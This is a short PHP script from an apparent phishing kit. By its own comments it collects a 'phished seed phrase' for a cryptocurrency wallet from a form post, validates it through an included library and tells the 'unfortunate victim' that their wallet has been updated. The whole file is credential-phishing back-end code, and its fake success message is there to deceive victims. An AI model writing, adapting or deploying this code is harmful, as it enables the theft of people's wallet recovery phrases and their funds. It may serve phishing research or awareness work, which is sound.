<?php

/* This file contains code that collects a phished seed phrase
* and performs some rudimentary validation on it
*
* Author: Josh McIntyre
*/

include "phishphormlib.php";

// Get the raw seed phrase from POST data
$seedphrase = $_POST["seedphrase"];

if (empty($seedphrase))
{
	die("Missing a seed phrase. Please provide one");
}

// Validate the seed phrase using the library
$seedphrase_valid = validate_seedphrase($seedphrase);

// Print the final validation info for our unfortunate victim
if ($seedphrase_valid != false)
{
	echo "Seed phrase seems valid, your wallet has been updated!";
}
else
{
	echo "Invalid seed phrase. Please provide another one.";
}

?>
